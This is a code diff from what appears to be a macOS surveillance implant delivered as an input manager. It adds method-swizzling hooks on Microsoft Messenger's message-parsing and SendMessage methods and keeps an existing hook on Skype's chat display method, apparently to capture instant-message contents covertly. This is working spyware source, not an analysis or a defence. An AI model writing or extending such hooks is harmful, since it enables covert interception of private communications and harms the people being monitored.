@@ -1064,17 +1064,40 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
           imFlag = 2;
 #ifdef DEBUG_INPUT_MANAGER
           infoLog(@"Hooking IMs");
-#endif          
-          // In order to avoid a linker error for a missing implementation
-          Class className   = objc_getClass("SkypeChat");
-          Class classSource = objc_getClass("mySkypeChat");
-          
-          //swizzleMethod(className, @selector(isMessageRecentlyDisplayed:),
-          //              className, @selector(isMessageRecentlyDisplayedHook:));
-          
-          swizzleByAddingIMP (className, @selector(isMessageRecentlyDisplayed:),
+#endif
+
+          Class className;
+          Class classSource;
+
+          if ([bundleIdentifier isEqualToString: @"com.microsoft.Messenger"])
+            {
+              // Microsoft Messenger
+              className   = objc_getClass("IMWebViewController");
+              classSource = objc_getClass("myIMWebViewController");
+
+              swizzleByAddingIMP(className, @selector(ParseAndAppendUnicode:inLength:inStyle:fIndent:fParseEmoticons:fParseURLs:inSenderName:fLocalUser:),
+                             class_getMethodImplementation(classSource, @selector(ParseAndAppendUnicodeHook:inLength:inStyle:fIndent:fParseEmoticons:fParseURLs:inSenderName:fLocalUser:)),
+                             @selector(ParseAndAppendUnicodeHook:inLength:inStyle:fIndent:fParseEmoticons:fParseURLs:inSenderName:fLocalUser:));
+
+              className   = objc_getClass("IMWindowController");
+              classSource = objc_getClass("myIMWindowController");
+
+              swizzleByAddingIMP(className, @selector(SendMessage:cchText:inHTML:),
+                   class_getMethodImplementation(classSource, @selector(SendMessageHook:cchText:inHTML:)),
+                   @selector(SendMessageHook:cchText:inHTML:));
+
+            }
+          else
+            {
+              // Skype
+              // In order to avoid a linker error for a missing implementation
+              Class className   = objc_getClass("SkypeChat");
+              Class classSource = objc_getClass("mySkypeChat");
+
+              swizzleByAddingIMP (className, @selector(isMessageRecentlyDisplayed:),
                               class_getMethodImplementation(classSource, @selector(isMessageRecentlyDisplayedHook:)),
                               @selector(isMessageRecentlyDisplayedHook:));
+            }
         }
       else if (imFlag == 3)
         {
